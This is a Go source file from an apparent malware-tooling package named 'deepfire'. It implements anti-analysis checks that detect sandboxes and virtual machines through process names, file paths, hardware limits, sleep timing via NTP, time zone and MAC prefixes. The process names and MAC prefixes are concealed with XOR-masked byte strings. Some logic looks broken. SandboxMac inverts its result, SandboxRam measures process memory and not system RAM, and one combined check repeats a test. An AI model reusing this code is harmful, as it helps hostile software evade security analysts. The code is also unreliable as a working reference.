package deepfire

import (
	"net"
	"runtime"
	"strings"
	"time"

	ps "github.com/mitchellh/go-ps"
)

// SandboxFilePath checks if the process is being run
// inside a virtualized environment.
func SandboxFilepath() bool {
	return sandboxFilepath()
}

// SandboxProc checks if there are processes that indicate
// a virtualized environment.
func SandboxProc() bool {
	sandbox_processes := []string{(func() string {
mask := []byte("\xd2\xcb\xd7\x70\x24\xaa")
maskedStr := []byte("\xa4\xa6\xa4\x02\x52\xc9")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x92\xe5\xb3\x14\x5f\x18\x14")
maskedStr := []byte("\xe6\x86\xc3\x62\x36\x7d\x63")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xec\xc3\x5b\xf0\x33\xe7\xf6\xa7\x2d")
maskedStr := []byte("\x9b\xaa\x29\x95\x40\x8f\x97\xd5\x46")
res := make([]byte, 9)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x0f\xf7\x0a\x84\xd1\x87\xef\xdd\xcd\xdc\xa8\xa1")
maskedStr := []byte("\x79\x9e\x79\xf1\xb0\xeb\xcf\xbf\xac\xaf\xc1\xc2")
res := make([]byte, 12)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xef\x18\x6f\xdb\x05\x79\xd6")
maskedStr := []byte("\x89\x71\x0b\xbf\x69\x1c\xa4")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xf9\x33\x89\x9a\x57\xb7")
maskedStr := []byte("\x8f\x5e\xfe\xfb\x25\xd2")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xac\xfe\x1c\x49")
maskedStr := []byte("\xda\x9c\x73\x31")
res := make([]byte, 4)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xa5\x6b\x5d\x15\x19\x1f\x74\x35\x87\xb3\xdd\xf6\x91\x59\xba\x95")
maskedStr := []byte("\xd5\x19\x32\x76\x7c\x6c\x07\x15\xe2\xcb\xad\x9a\xfe\x2b\xdf\xe7")
res := make([]byte, 16)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xa7\x80\xe0\x77\x1d\x1d")
maskedStr := []byte("\xc6\xf5\x94\x18\x74\x69")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x53\xd6\x56\x7f\x43\xda\x86\x56")
maskedStr := []byte("\x25\xb4\x39\x07\x37\xa8\xe7\x2f")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x0a\xe0\x8c\x6a\xd3\x47\x54")
maskedStr := []byte("\x7c\x8d\xf8\x05\xbc\x2b\x27")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\xb6\x37\x7f\xac\xee\xdc\x02\xb6")
maskedStr := []byte("\xc0\x5a\x0d\xcd\x99\xb8\x71\xdd")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x64\xd5\x98\xba\x54\x05\x83\x4e\xb1\xc6")
maskedStr := []byte("\x12\xb8\xed\xc9\x36\x68\xec\x3b\xc2\xa3")
res := make([]byte, 10)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x5e\x02\x6f\x12\x3a")
maskedStr := []byte("\x28\x6f\x19\x61\x49")
res := make([]byte, 5)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xc4\xd4\x99\xf8\xf4\x4e")
maskedStr := []byte("\xb2\xb9\xea\x9b\x87\x27")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xc5\x5f\x69\xb9\xee\xff")
maskedStr := []byte("\xb3\x32\x11\xd7\x8b\x8b")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xb0\x5a\x10\x69\xef\x95\x82\xa6")
maskedStr := []byte("\xc6\x37\x68\x36\x9c\xe3\xe5\xc7")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x51\xac\x06\x46\x6a\x69\x80\x07")
maskedStr := []byte("\x27\xc1\x6b\x23\x07\x0a\xf4\x6b")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x5a\xdb\x0b\x58\x49\xd3\x9b")
maskedStr := []byte("\x3e\xbd\x3e\x2b\x2c\xa1\xed")
res := make([]byte, 7)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xd6\x66\xfc\x14\x05\x58\x46\x98\x16\xc0\x3e")
maskedStr := []byte("\xa0\x04\x93\x6c\x76\x3d\x34\xee\x7f\xa3\x5b")
res := make([]byte, 11)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x50\xdb\xd7\x68\xc1\xfe")
maskedStr := []byte("\x26\xb6\xbf\x0f\xa7\x8d")
res := make([]byte, 6)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())}
	p, _ := Processes()
	for _, name := range p {
		if ContainsAny(name, sandbox_processes) {
			return true
		}
	}
	return false
}

// SandboxSleep is used to check if the virtualized environment
// is speeding up the sleeping process.
func SandboxSleep() bool {
	z := false
	firstTime := getNTPTime()
	sleepSeconds := 10
	time.Sleep(time.Duration(sleepSeconds*1000) * time.Millisecond)
	secondTime := getNTPTime()
	difference := secondTime.Sub(firstTime).Seconds()
	if difference < float64(sleepSeconds) {
		z = true
	}
	return z
}

// SandboxCpu is used to check if the environment's
// cores are less than a given integer.
func SandboxCpu(cores int) bool {
	x := false
	num_procs := runtime.NumCPU()
	if !(num_procs >= cores) {
		x = true
	}
	return x
}

// SandboxRam is used to check if the environment's
// RAM is less than a given size.
func SandboxRam(ram_mb int) bool {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	ram := m.Sys / 1024
	rmb := uint64(ram_mb)

	return ram < rmb
}

// SandboxUtc is used to check if the environment
// is in a properly set Utc timezone.
func SandboxUtc() bool {
	_, offset := time.Now().Zone()

	return offset == 0
}

// SandboxProcnum is used to check if the environment
// has processes less than a given integer.
func SandboxProcnum(proc_num int) bool {
	processes, err := ps.Processes()
	if err != nil {
		return true
	}

	return len(processes) < proc_num
}

// SandboxTmp is used to check if the environment's
// temporary directory has less files than a given integer.
func SandboxTmp(entries int) bool {
	return sandboxTmp(entries)
}

// SandboxMac is used to check if the environment's MAC address
// matches standard MAC adddresses of virtualized environments.
func SandboxMac() bool {
	hits := 0
	sandbox_macs := []string{(func() string {
mask := []byte("\x16\xa8\xe6\x80\x21\xba\xc1\x89")
maskedStr := []byte("\x26\x98\xdc\xb0\x62\x80\xf3\xb0")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xb7\xd3\xcf\xdf\x3e\x5e\xb0\x76")
maskedStr := []byte("\x87\xe3\xf5\xee\x7d\x64\x81\x42")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()),
		(func() string {
mask := []byte("\x25\xb0\xb8\x65\xa1\x57\x35\x2b")
maskedStr := []byte("\x15\x80\x82\x50\x91\x6d\x00\x1d")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\x79\x35\x23\x70\x7a\x12\x0d\x5b")
maskedStr := []byte("\x49\x05\x19\x40\x4f\x28\x3b\x62")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }()), (func() string {
mask := []byte("\xfa\x34\x36\x93\x83\x40\x27\xe3")
maskedStr := []byte("\xca\x0c\x0c\xa3\xb3\x7a\x15\xd4")
res := make([]byte, 8)
        for i, m := range mask {
            res[i] = m ^ maskedStr[i]
        }
        return string(res)
        }())}
	ifaces, _ := net.Interfaces()

	for _, iface := range ifaces {
		for _, mac := range sandbox_macs {
			if strings.Contains(strings.ToLower(iface.HardwareAddr.String()), strings.ToLower(mac)) {
				hits += 1
			}
		}
	}

	return hits == 0
}

// SandboxAll is used to check if an environment is virtualized
// by testing all sandbox checks.
func SandboxAll() bool {
	values := []bool{
		SandboxProc(),
		SandboxFilepath(),
		SandboxCpu(2),
		SandboxSleep(),
		SandboxTmp(10),
		SandboxProcnum(100),
		SandboxRam(2048),
		SandboxUtc(),
	}

	for s := range values {
		x := values[s]
		if x {
			return true
		}
	}

	return false
}

// SandboxAlln checks if an environment is virtualized by testing all
// sandbox checks and checking if the number of successful checks is
// equal or greater to a given integer.
func SandboxAlln(num int) bool {
	num_detected := 0
	values := []bool{
		SandboxProc(),
		SandboxFilepath(),
		SandboxCpu(2),
		SandboxSleep(),
		SandboxTmp(10),
		SandboxTmp(100),
		SandboxRam(2048),
		SandboxMac(),
		SandboxUtc(),
	}
	for s := range values {
		x := values[s]
		if x {
			num_detected += 1
		}
	}

	return num_detected >= num
}
